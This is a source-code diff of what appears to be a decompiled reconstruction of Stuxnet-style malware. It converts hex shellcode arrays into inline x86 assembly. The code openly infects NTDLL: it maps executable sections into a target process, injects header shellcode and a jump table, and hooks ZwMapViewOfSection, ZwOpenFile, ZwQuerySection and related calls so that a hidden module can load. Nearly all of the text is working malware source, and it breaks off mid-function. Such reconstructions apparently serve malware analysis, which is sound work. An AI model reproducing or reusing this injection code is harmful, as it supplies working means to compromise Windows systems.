@@ -16,9 +16,23 @@
 
 #include "data.h"
 
-extern const char NTDLL_HEADER_SHELLCODE[41];
-extern const char NTDLL_TABLE[206];
-extern const char NTDLL_TABLE2[915];
+void __ASM_BLOCK0_0(void);
+void __ASM_BLOCK0_1(void);
+void __ASM_BLOCK0_2(void);
+
+void __ASM_BLOCK1_0(void);
+void __ASM_BLOCK1_1(void);
+void __ASM_BLOCK1_2(void);
+void __ASM_BLOCK1_3(void);
+void __ASM_BLOCK1_4(void);
+void __ASM_BLOCK1_5(void);
+void __ASM_BLOCK1_6(void);
+
+void __ASM_REF_3(void);
+void __ASM_REF_4(void);
+void __ASM_REF_5(void);
+void __ASM_REF_6(void);
+void __ASM_REF_7(void);
 
 extern const HMODULE NTDLL_DLL;
 
@@ -44,7 +58,7 @@ void DecryptRVASection(char *pSectionRVA, unsigned int pSectionVirtualSize);
 int  LocateRVASection(int *pSectionRVA, int *pSectionVirtualSize);
 
 void CheckSystemVersion(_DWORD _unused);
-char *__usercall UnusedFunction(unsigned int a1, int a2);
+void UnusedFunction();
 int __thiscall DecodeEncryptedModuleNames(DWORD dwOld);
 int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSectionHandle, PVOID *ZwCurrentProcessBaseAddress, PVOID *ZwModuleProcessBaseAddress);
 void _ZwMoveSectionPointer(void **ZwSectionAddr1, void *ZwSectionAddr2, int *ZwSectionPointer, int *ZwInformation, const void *ZwSectionContent, unsigned int ZwSectionSize);
@@ -281,19 +295,34 @@ void CheckSystemVersion(_DWORD a1)
 ** Currently this function is unused, maybe it was used in the past     **
 ** versions of MyRTUs, but in any case I don't understand its function. **
 *************************************************************************/
-char *__usercall UnusedFunction(unsigned int a1, int a2)
+void __declspec(naked) UnusedFunction()
 {
-	unsigned int i;
-	unsigned int v2; // ecx@1
-	int v5; // [sp-4h] [bp-4h]@1
-	char *v6; // [sp+0h] [bp+0h]@1
+	__asm
+	{
+		push    ecx
+		lea     ecx, [esp+4]
+		sub     ecx, eax
+		sbb     eax, eax
+		not     eax
+		and     ecx, eax
+		mov     eax, esp
+		and     eax, 0FFFFF000h
 
-	v5 = a2;
-	v2 = ~((unsigned int)&(&v6)[-(unsigned __int64)a1] >> 32) & (unsigned int)&(&v6)[-a1];
-	
-	for(i = (unsigned int)&v5 & 0xFFFFF000; v2 < i; i -= 4096);
-	
-	return v6;
+__ASM_REF_0:
+		cmp     ecx, eax
+		jb      short __ASM_REF_1
+		mov     eax, ecx
+		pop     ecx
+		xchg    eax, esp
+		mov     eax, [eax]
+		mov     [esp+0], eax
+		retn
+
+__ASM_REF_1:
+		sub     eax, 1000h
+		test    [eax], eax
+		jmp     short __ASM_REF_0
+	}
 }
 
 /*************************************************************************
@@ -343,7 +372,7 @@ int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSe
 	NTSTATUS ZwStatus; // [sp+4h] [bp-Ch]@3
 	LARGE_INTEGER ZwMaximumSize; // [sp+8h] [bp-8h]@1
 
-	ZwViewSize = ZwSectionSize;
+	ZwViewSize = (PSIZE_T)ZwSectionSize;
 	
 	ZwMaximumSize.LowPart  = ZwSectionSize;
 	ZwMaximumSize.HighPart = 0;
@@ -352,11 +381,11 @@ int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSe
 	if(_ZwCreateSection(ZwSectionHandle, SECTION_ALL_ACCESS, 0, &ZwMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0) != STATUS_SUCCESS) return -5;
 	
 	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
-	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, GetCurrentProcess(), ZwCurrentProcessBaseAddress, 0, 0, 0, &ZwViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
+	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, GetCurrentProcess(), ZwCurrentProcessBaseAddress, 0, 0, 0, (PSIZE_T)&ZwViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
 	if(ZwStatus != STATUS_SUCCESS) return -5;
 	
 	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
-	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, ZwModuleProcessHandle, ZwModuleProcessBaseAddress, 0, 0, 0, &ZwViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
+	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, ZwModuleProcessHandle, ZwModuleProcessBaseAddress, 0, 0, 0, (PSIZE_T)&ZwViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
 	if(ZwStatus != STATUS_SUCCESS) return -5;
 	
 	return 0;
@@ -479,14 +508,14 @@ int sub_100016A5(int a1, void *a2, const void *a3)
 	Dst[0] ^= 0xAE1979DD;
 	Dst[1] = 0;
 	
-	v7 = (UINT32)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (UINT32)&NTDLL_TABLE;
+	v7 = (UINT32)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (UINT32)&__ASM_BLOCK1_0;
 	
 	v6 = NTDLL_CODE_SHELLCODE_FUNC7(v7, (int)&Dst, *((const void **)a2 + 35), *((_DWORD *)a2 + 36));
 	if(v6) return v6;
 	
 	if(NTDLL_CODE_SHELLCODE_FUNC6(a1, v7)) return -4;
 	
-	v4 = (*(int (__stdcall **)(_DWORD))(v7 + 36))(&Dst[4]);
+	v4 = (*(int (__stdcall **)(_DWORD))(v7 + 36))((_DWORD)&Dst[4]);
 	if(!v4) return -9;
 	
 	*((_DWORD *)a2 + 32) = v4;
@@ -571,7 +600,7 @@ int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4)
 	// So, the final result is 2874
 	
 	iShellcodeSize = GetNTDLLCodeShellcodeSize();
-	v12 = iShellcodeSize + (UINT32)&DecodeModuleNameA - (UINT32)&NTDLL_TABLE + (UINT32)&NTDLL_TABLE - (UINT32)&NTDLL_HEADER_SHELLCODE + 36; // 2874
+	v12 = iShellcodeSize + (UINT32)&DecodeModuleNameA - (UINT32)&__ASM_BLOCK1_0 + (UINT32)&__ASM_BLOCK1_0 - (UINT32)&__ASM_BLOCK0_0 + 36; // 2874
 	
 	iPointer = 0;
 	
@@ -584,15 +613,15 @@ int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4)
 	
 	iPointer = 36;
 	
-	// Inject a new table into the NTDLL code (NTDLL_TABLE)
-	// &DecodeModuleNameA - &NTDLL_TABLE = [0x04A5] (1189)
-	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 2, NTDLL_TABLE, (UINT32)&DecodeModuleNameA - (UINT32)&NTDLL_TABLE);
+	// Inject a new table into the NTDLL code (__ASM_BLOCK1_0)
+	// &DecodeModuleNameA - &__ASM_BLOCK1_0 = [0x04A5] (1189)
+	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 2, __ASM_BLOCK1_0, (UINT32)&DecodeModuleNameA - (UINT32)&__ASM_BLOCK1_0);
 	
 	iPointerCodeShell = iPointer;
 	
-	// Inject the shellcode into the NTDLL header (NTDLL_HEADER_SHELLCODE)
-	// &NTDLL_TABLE - &NTDLL_HEADER_SHELLCODE = [0x0029] (41)
-	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 6, NTDLL_HEADER_SHELLCODE, (UINT32)&NTDLL_TABLE - (UINT32)&NTDLL_HEADER_SHELLCODE);
+	// Inject the shellcode into the NTDLL header (__ASM_BLOCK0_0)
+	// &__ASM_BLOCK1_0 - &__ASM_BLOCK0_0 = [0x0029] (41)
+	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 6, __ASM_BLOCK0_0, (UINT32)&__ASM_BLOCK1_0 - (UINT32)&__ASM_BLOCK0_0);
 	
 	pShellcode = (void *)GetNTDLLCodeShellcode();
 	
@@ -601,8 +630,8 @@ int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4)
 	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 4, pShellcode, iShellcodeSize);
 	
 	// Uknown
-	v9 = (int *)((UINT32)&pCurrentProcessMapView + (UINT32)&iPointerCodeShell + (UINT32)&NTDLL_HEADER_SHELLCODE[8] + 2 - (UINT32)&NTDLL_HEADER_SHELLCODE);
-	*v9 = (UINT32)&pCurrentProcessMapView[2] + (UINT32)&NTDLL_TABLE2 - (UINT32)&NTDLL_TABLE;
+	v9 = (int *)((UINT32)&pCurrentProcessMapView + (UINT32)&iPointerCodeShell + (UINT32)&__ASM_BLOCK0_1 - (UINT32)&__ASM_BLOCK0_0);
+	*v9 = (UINT32)&pCurrentProcessMapView[2] + (UINT32)&__ASM_REF_3 - (UINT32)&__ASM_BLOCK1_0;
 	
 	// Uknown
 	pCurrentProcessMapView[0] = (UINT32)&pCurrentProcessMapView[4] + GetRealtivePositionOfFunc1();
@@ -656,90 +685,655 @@ int InfectSystem(LPCWSTR szRandomModuleName, const void *pPE, unsigned int iSize
 	return v9;
 }
 
-
-/*************************************************************************
-** This arrays of code, tables and pointers are stored in the ".text"   **
-** section.                                                             **
-*************************************************************************/
 #pragma code_seg(".text")
 #define A_TEXT __declspec(allocate(".text"))
-A_TEXT const char NTDLL_HEADER_SHELLCODE[41] = {0x3B, 0x10, 0x49, 0xAB, 0xB2, 0x00, 0xEB, 0x14, 0xB2, 0x01, 0xEB, 0x10, 0xB2, 0x02, 0xEB, 0x0C,
-0xB2, 0x03, 0xEB, 0x08, 0xB2, 0x04, 0xEB, 0x04, 0xB2, 0x05, 0xEB, 0x00, 0x52, 0xE8, 0x04, 0x00,
-0x00, 0x00, 0x87, 0x1B, 0x00, 0x10, 0x5A, 0xFF, 0x22};
 
-A_TEXT const char NTDLL_TABLE[206] = {0xE8, 0x13, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x4D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66,
-0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x04, 0x00, 0x00, 0x00,
-0xE8, 0x66, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x10, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x43, 0x72, 0x65,
-0x61, 0x74, 0x65, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x08,
-0x00, 0x00, 0x00, 0xE8, 0x43, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x5A, 0x77,
-0x4F, 0x70, 0x65, 0x6E, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x0C, 0x00, 0x00,
-0x00, 0xE8, 0x25, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x43, 0x6C,
-0x6F, 0x73, 0x65, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x10, 0x00, 0x00, 0x00, 0xE8, 0x0A, 0x03, 0x00,
-0x00, 0x59, 0xE8, 0x16, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x51, 0x75, 0x65, 0x72, 0x79, 0x41, 0x74,
-0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x5A, 0x51, 0x81,
-0xC1, 0x14, 0x00, 0x00, 0x00, 0xE8, 0xE1, 0x02, 0x00, 0x00, 0x59, 0xE8, 0x0F, 0x00, 0x00, 0x00,
-0x5A, 0x77, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A,
-0x51, 0x81, 0xC1, 0x18, 0x00, 0x00, 0x00, 0xE8, 0xBF, 0x02, 0x00, 0x00, 0x59, 0xC3};
+/*************************************************************************
+** ASSEMBLY BLOCK 0.                                                    **
+*************************************************************************/
 
-A_TEXT const char NTDLL_TABLE2[915] = {0x5A, 0x84, 0xD2, 0x74, 0x25, 0xFE, 0xCA, 0x0F, 0x84, 0x82, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F,
-0x84, 0xBB, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F, 0x84, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0xCA, 0x0F,
-0x84, 0x40, 0x01, 0x00, 0x00, 0xE9, 0x8C, 0x01, 0x00, 0x00, 0xE8, 0xF9, 0x01, 0x00, 0x00, 0x85,
-0xD2, 0x74, 0x13, 0x52, 0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x0C, 0x75, 0x08, 0xC7, 0x44, 0x24,
-0x30, 0x40, 0x00, 0x00, 0x00, 0x5A, 0x52, 0xE8, 0x1E, 0x02, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00,
-0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08,
-0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x23, 0xE8, 0xB8, 0x01, 0x00, 0x00,
-0x85, 0xD2, 0x74, 0x18, 0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x08, 0x75, 0x0F, 0x8B, 0x54, 0x24,
-0x10, 0x52, 0xE8, 0xA1, 0x01, 0x00, 0x00, 0x8B, 0x52, 0x0C, 0xFF, 0xD2, 0x33, 0xC0, 0xC3, 0x81,
-0x7C, 0x24, 0x20, 0xAE, 0x82, 0x19, 0xAE, 0x75, 0x15, 0xE8, 0x8A, 0x01, 0x00, 0x00, 0x85, 0xD2,
-0x74, 0x0C, 0x8B, 0x52, 0x08, 0x8B, 0x44, 0x24, 0x08, 0x89, 0x10, 0x33, 0xC0, 0xC3, 0x52, 0xE8,
-0xB6, 0x01, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD,
-0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3,
-0xE8, 0x53, 0x01, 0x00, 0x00, 0x85, 0xD2, 0x74, 0x20, 0x50, 0x57, 0x8B, 0x7C, 0x24, 0x18, 0xE8,
-0x93, 0x01, 0x00, 0x00, 0x8B, 0xD0, 0x5F, 0x58, 0x85, 0xD2, 0x74, 0x0D, 0x8B, 0x44, 0x24, 0x08,
-0xC7, 0x00, 0xAE, 0x82, 0x19, 0xAE, 0x33, 0xC0, 0xC3, 0x52, 0xE8, 0x6B, 0x01, 0x00, 0x00, 0x83,
-0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D,
-0x54, 0x24, 0x08, 0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0x81, 0x7C, 0x24, 0x08, 0xAE,
-0x82, 0x19, 0xAE, 0x75, 0x03, 0x33, 0xC0, 0xC3, 0xE8, 0xFB, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x74,
-0x12, 0x50, 0x8B, 0x44, 0x24, 0x0C, 0x39, 0x42, 0x08, 0x75, 0x07, 0xC7, 0x42, 0x08, 0x00, 0x00,
-0x00, 0x00, 0x58, 0x52, 0xE8, 0x21, 0x01, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09, 0x5A,
-0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF, 0x15,
-0xC0, 0x00, 0x00, 0x00, 0xC3, 0xE8, 0xBE, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x74, 0x26, 0x50, 0x52,
-0x57, 0x8B, 0x7C, 0x24, 0x14, 0xE8, 0xFD, 0x00, 0x00, 0x00, 0x5F, 0x5A, 0x85, 0xC0, 0x74, 0x13,
-0x58, 0x85, 0xD2, 0x74, 0x0B, 0x8B, 0x54, 0x24, 0x0C, 0xC7, 0x42, 0x20, 0x80, 0x00, 0x00, 0x00,
-0x33, 0xC0, 0xC3, 0x58, 0x52, 0xE8, 0xD0, 0x00, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00, 0x75, 0x09,
-0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0x64, 0xFF,
-0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0xE8, 0x6D, 0x00, 0x00, 0x00, 0x85, 0xD2, 0x52, 0x74, 0x45,
-0x8B, 0x52, 0x08, 0x3B, 0x54, 0x24, 0x0C, 0x75, 0x3C, 0x83, 0x7C, 0x24, 0x10, 0x01, 0x75, 0x35,
-0x83, 0x7C, 0x24, 0x18, 0x30, 0x7C, 0x27, 0x5A, 0x51, 0x56, 0x57, 0x8D, 0x72, 0x50, 0x8B, 0x7C,
-0x24, 0x1C, 0xB9, 0x30, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x5F, 0x5E, 0x59, 0x8B, 0x44, 0x24, 0x18,
-0x83, 0xF8, 0x00, 0x74, 0x06, 0xC7, 0x00, 0x30, 0x00, 0x00, 0x00, 0x33, 0xC0, 0xC3, 0x5A, 0xB8,
-0x0D, 0x00, 0x00, 0xC0, 0xC3, 0x5A, 0x52, 0xE8, 0x5E, 0x00, 0x00, 0x00, 0x83, 0x7A, 0x04, 0x00,
-0x75, 0x09, 0x5A, 0x8D, 0x54, 0x24, 0x08, 0xCD, 0x2E, 0xEB, 0x0C, 0x5A, 0x8D, 0x54, 0x24, 0x08,
-0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00, 0xC3, 0x50, 0x56, 0x57, 0x51, 0x52, 0x83, 0xEC, 0x1C,
-0x8B, 0xC4, 0x6A, 0x1C, 0x50, 0x54, 0xE8, 0x2F, 0x00, 0x00, 0x00, 0xFF, 0x52, 0x0C, 0x8B, 0x3C,
-0x24, 0x03, 0x7C, 0x24, 0x0C, 0x83, 0xC4, 0x1C, 0x5A, 0x59, 0x8B, 0xF4, 0x3B, 0xF7, 0x73, 0x12,
-0xAD, 0x35, 0xDD, 0x79, 0x19, 0xAE, 0x8D, 0x40, 0x04, 0x3B, 0xC6, 0x75, 0xEF, 0x8D, 0x46, 0xFC,
-0xEB, 0x02, 0x33, 0xC0, 0x8B, 0xD0, 0x5F, 0x5E, 0x58, 0xC3, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A,
-0x81, 0xC2, 0x24, 0x01, 0x00, 0x00, 0xC3, 0x53, 0x51, 0x52, 0x57, 0x83, 0xFF, 0x00, 0x74, 0x36,
-0x8B, 0x7F, 0x08, 0x83, 0xFF, 0x00, 0x74, 0x2E, 0x0F, 0xB7, 0x1F, 0x8B, 0x7F, 0x04, 0x8D, 0x5C,
-0x1F, 0x02, 0x8D, 0x5B, 0xFE, 0x3B, 0xDF, 0x7E, 0x1D, 0x66, 0x83, 0x7B, 0xFE, 0x5C, 0x75, 0xF2,
-0x52, 0x53, 0x8D, 0x5A, 0x10, 0x53, 0xE8, 0xBF, 0xFF, 0xFF, 0xFF, 0xFF, 0x52, 0x08, 0x5A, 0x85,
-0xC0, 0x75, 0x03, 0x40, 0xEB, 0x02, 0x33, 0xC0, 0x5F, 0x5A, 0x59, 0x5B, 0xC3, 0x50, 0x51, 0x52,
-0xE8, 0xA5, 0xFF, 0xFF, 0xFF, 0xC7, 0x42, 0x04, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x32, 0xFF, 0x52,
-0x14, 0x59, 0x85, 0xC0, 0x0F, 0x84, 0xB7, 0x00, 0x00, 0x00, 0x50, 0x51, 0x50, 0x54, 0x68, 0x80,
-0x00, 0x00, 0x00, 0x6A, 0x18, 0x50, 0xE8, 0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0x52, 0x10, 0x5A, 0x8B,
-0xD0, 0x59, 0x58, 0x85, 0xD2, 0x0F, 0x84, 0x96, 0x00, 0x00, 0x00, 0x80, 0x38, 0xB8, 0x0F, 0x85,
-0x8D, 0x00, 0x00, 0x00, 0x80, 0x78, 0x05, 0xBA, 0x74, 0x70, 0x81, 0x78, 0x05, 0x8D, 0x54, 0x24,
-0x04, 0x75, 0x1B, 0x81, 0x78, 0x08, 0x04, 0xCD, 0x2E, 0xC2, 0x75, 0x75, 0x2B, 0xC8, 0x83, 0xE9,
-0x0A, 0x89, 0x48, 0x06, 0xC6, 0x40, 0x05, 0xE8, 0xC6, 0x40, 0x0A, 0x90, 0xEB, 0x63, 0x81, 0x78,
-0x07, 0x8D, 0x54, 0x24, 0x04, 0x75, 0x5A, 0x81, 0x78, 0x0B, 0x64, 0xFF, 0x15, 0xC0, 0x75, 0x51,
-0x81, 0x78, 0x0F, 0x00, 0x00, 0x00, 0xC2, 0x75, 0x48, 0x52, 0xE8, 0x1B, 0xFF, 0xFF, 0xFF, 0xC7,
-0x42, 0x04, 0x01, 0x00, 0x00, 0x00, 0x5A, 0x56, 0x50, 0x53, 0x51, 0x52, 0x8B, 0xF0, 0x8B, 0x46,
-0x0A, 0x8B, 0x56, 0x0E, 0x2B, 0xCE, 0x83, 0xE9, 0x12, 0xBB, 0x04, 0x90, 0x90, 0xE8, 0xF0, 0x0F,
-0xC7, 0x4E, 0x0A, 0x5A, 0x59, 0x5B, 0x58, 0x5E, 0xEB, 0x17, 0x66, 0x81, 0x78, 0x0A, 0xFF, 0xD2,
-0x74, 0x0C, 0x66, 0x81, 0x78, 0x0A, 0xFF, 0x12, 0x75, 0x07, 0xC6, 0x40, 0x0B, 0xD2, 0x89, 0x48,
-0x06, 0x58, 0xC3};
+void __declspec(naked) __ASM_BLOCK0_0(void)
+{
+	__asm
+	{
+		cmp     edx, [eax]
+		dec     ecx
+		stosd
 
+		mov     dl, 0
+		jmp     short __ASM_REF_0
+		
+		mov     dl, 1
+		jmp     short __ASM_REF_0
+		
+		mov     dl, 2
+		jmp     short __ASM_REF_0
+		
+		mov     dl, 3
+		jmp     short __ASM_REF_0
+		
+		mov     dl, 4
+		jmp     short __ASM_REF_0
+		
+		mov     dl, 5
+		jmp     short $+2
+		
+	__ASM_REF_0:
+		push    edx
+		call    __ASM_BLOCK0_2
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK0_1(void)
+{
+	__asm
+	{
+		xchg    ebx, [ebx+0]
+		add     [eax], dl
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK0_2(void)
+{
+	__asm
+	{
+		pop     edx
+		jmp     dword ptr [edx]
+	}
+}
+
+/*************************************************************************
+** ASSEMBLY BLOCK 1.                                                    **
+*************************************************************************/                                    
+
+#define ASM_EMIT __asm _emit
+
+#define ASM_ZwMapViewOfSection \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'M' ASM_EMIT 'a' ASM_EMIT 'p' ASM_EMIT 'V' ASM_EMIT 'i' ASM_EMIT 'e' ASM_EMIT 'w'  ASM_EMIT 'O' ASM_EMIT 'f' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'
+
+#define ASM_ZwCreateSection \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'C' ASM_EMIT 'r' ASM_EMIT 'e' ASM_EMIT 'a' ASM_EMIT 't' ASM_EMIT 'e' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'
+
+#define ASM_ZwOpenFile \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'O' ASM_EMIT 'p' ASM_EMIT 'e' ASM_EMIT 'n' ASM_EMIT 'F' ASM_EMIT 'i' ASM_EMIT 'l' ASM_EMIT 'e' ASM_EMIT '\0'
+
+#define ASM_ZwClose \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'C' ASM_EMIT 'l' ASM_EMIT 'o' ASM_EMIT 's' ASM_EMIT 'e' ASM_EMIT '\0'
+
+#define ASM_ZwQueryAttributesFile \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'Q' ASM_EMIT 'u' ASM_EMIT 'e' ASM_EMIT 'r' ASM_EMIT 'y' ASM_EMIT 'A' ASM_EMIT 't'  ASM_EMIT 't' ASM_EMIT 'r' ASM_EMIT 'i' ASM_EMIT 'b' ASM_EMIT 'u' ASM_EMIT 't' ASM_EMIT 'e' ASM_EMIT 's' ASM_EMIT 'F' ASM_EMIT 'i' ASM_EMIT 'l' ASM_EMIT 'e' ASM_EMIT '\0'
+
+#define ASM_ZwQuerySection \
+	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'Q' ASM_EMIT 'u' ASM_EMIT 'e' ASM_EMIT 'r' ASM_EMIT 'y' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'
+
+
+void __declspec(naked) __ASM_BLOCK1_0(void)
+{
+	__asm
+	{
+		call    __ASM_BLOCK1_1
+		ASM_ZwMapViewOfSection
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_1(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 4
+		call    __ASM_REF_7
+		pop     ecx
+		call    __ASM_BLOCK1_2
+		ASM_ZwCreateSection
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_2(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 8
+		call    __ASM_REF_7
+		pop     ecx
+		call    __ASM_BLOCK1_3
+		ASM_ZwOpenFile
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_3(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 8
+		call    __ASM_REF_7
+		pop     ecx
+		call    __ASM_BLOCK1_4
+		ASM_ZwClose
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_4(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 10h
+		call    __ASM_REF_7
+		pop     ecx
+		call    __ASM_BLOCK1_5
+		ASM_ZwQueryAttributesFile
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_5(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 14h
+		call    __ASM_REF_7
+		pop     ecx
+		call    __ASM_BLOCK1_6
+		ASM_ZwQuerySection
+	}
+}
+
+void __declspec(naked) __ASM_BLOCK1_6(void)
+{
+	__asm
+	{
+		pop     edx
+		push    ecx
+		add     ecx, 18h
+		call    __ASM_REF_7
+		pop     ecx
+		retn
+	}
+}
+
+/*************************************************************************
+** ASSEMBLY BLOCK 2.                                                    **
+*************************************************************************/
+
+void __declspec(naked) __ASM_REF_3(void)
+{
+	__asm
+	{
+		pop     edx
+		test    dl, dl
+		jz      short __REF_0
+		dec     dl
+		jz      __REF_7
+		dec     dl
+		jz      __REF_11
+		dec     dl
+		jz      __REF_15
+		dec     dl
+		jz      __REF_21
+		jmp     __REF_27
+
+	__REF_0:
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_2
+		push    edx
+		mov     edx, [edx+8]
+		cmp     edx, [esp+8]
+		jnz     short __REF_1
+		mov     dword ptr [esp+30h], 40h
+
+	__REF_1:
+		pop     edx
+
+	__REF_2:
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_3
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
+		jmp     short __REF_4
+
+	__REF_3:
+		pop     edx
+		lea     edx, [esp+8]
+		call    dword ptr fs:0C0h ; call    large dword ptr fs:0C0h
+
+	__REF_4:
+		test    eax, eax
+		jnz     short __REF_6
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_5
+		mov     edx, [edx+8]
+		cmp     edx, [esp+8]
+		jnz     short __REF_5
+		mov     edx, [esp+16]
+		push    edx
+		call    __ASM_REF_4
+		mov     edx, [edx+0Ch]
+		call    edx
+
+	__REF_5:
+		xor     eax, eax
+
+	__REF_6:
+		retn
+
+	__REF_7:
+		cmp     dword ptr [esp+20h], 0AE1982AEh
+		jnz     short __REF_8
+		call    __ASM_REF_4
+		test    edx, edx
+		jz      short __REF_8
+		mov     edx, [edx+8]
+		mov     eax, [esp+8]
+		mov     [eax], edx
+		xor     eax, eax
+		retn
+
+	__REF_8:
+		push    edx
+		call    __ASM_REF_5
+		cmp     dword ptr [edx+4], 0
+		jnz     short __REF_9
+		pop     edx
+		lea     edx, [esp+8]
+		int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND
+								; DS:SI -> counted CR-terminated command string
